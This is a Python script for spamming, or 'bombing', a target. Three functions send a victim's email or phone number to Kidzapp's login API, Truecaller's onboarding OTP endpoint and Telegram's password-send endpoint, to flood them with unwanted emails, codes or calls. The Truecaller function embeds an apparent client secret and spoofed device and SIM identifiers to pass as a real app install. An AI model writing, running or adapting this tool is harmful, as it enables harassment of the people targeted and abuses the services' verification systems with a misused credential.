import requests
from user_agent import generate_user_agent
import hashlib
import random
def EmailSpam(email):
    headers = {
        'authority': 'api.kidzapp.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
        'content-type': 'application/json',
        'origin': 'https://kidzapp.com',
        'referer': 'https://kidzapp.com/',
        'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': str(generate_user_agent()),
    }

    json_data = {
        'email': email,
        'sdk': 'web',
        'platform': 'desktop',
    }

    response2 = requests.post('https://api.kidzapp.com/api/3.0/customlogin/', headers=headers, json=json_data).text
    if 'EMAIL SENT' in response2:
        return {'status': 'DONE SEND', 'AHMED': '@maho_s9'}
    else:
        return {'status': 'Sorry Error Send', 'AHMED': '@maho_s9'}


def SpamCall(number):
    asa = '123456789'
    gigk = ''.join(random.choice(asa) for i in range(10))
    md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]

    headers = {
        "Host": "account-asia-south1.truecaller.com",
        "content-type": "application/json; charset=UTF-8",
        "content-length": "680",
        "accept-encoding": "gzip",
        "user-agent": "Truecaller/12.34.8 (Android;8.1.2)",
        "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
    }

    url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp"

    data = {
        "countryCode": "eg",
        "dialingCode": 20,
        "installationDetails": {
            "app": {
                "buildVersion": 8,
                "majorVersion": 12,
                "minorVersion": 34,
                "store": "GOOGLE_PLAY"
            },
            "device": {
                "deviceId": md5,
                "language": "ar",
                "manufacturer": "Xiaomi",
                "mobileServices": ["GMS"],
                "model": "Redmi Note 8A Prime",
                "osName": "Android",
                "osVersion": "7.1.2",
                "simSerials": ["8920022021714943876f", "8920022022805258505f"]
            },
            "language": "ar",
            "sims": [
                {"imsi": "602022207634386", "mcc": "602", "mnc": "2", "operator": "vodafone"},
                {"imsi": "602023133590849", "mcc": "602", "mnc": "2", "operator": "vodafone"}
            ],
            "storeVersion": {
                "buildVersion": 8,
                "majorVersion": 12,
                "minorVersion": 34
            }
        },
        "phoneNumber": number,
        "region": "region-2",
        "sequenceNo": 1
    }

    response = requests.post(url, headers=headers, json=data).json()

    if response.get('message') == 'Sent':
        return {'status': 'DONE SEND', 'AHMED': '@maho_s9'}
    else:
        return {'status': 'Sorry Error Send', 'AHMED': '@maho_s9'}

def SpamTele(number):
    headers = {
        'authority': 'my.telegram.org',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://my.telegram.org',
        'referer': 'https://my.telegram.org/auth',
        'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'phone': number,
    }
    rr = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data=data).text
    if "random_hash" in rr:
        return {'status': 'DONE SEND', 'AHMED': '@maho_s9'}
    else:
        return {'status': 'Sorry Error Send', 'AHMED': '@maho_s9'}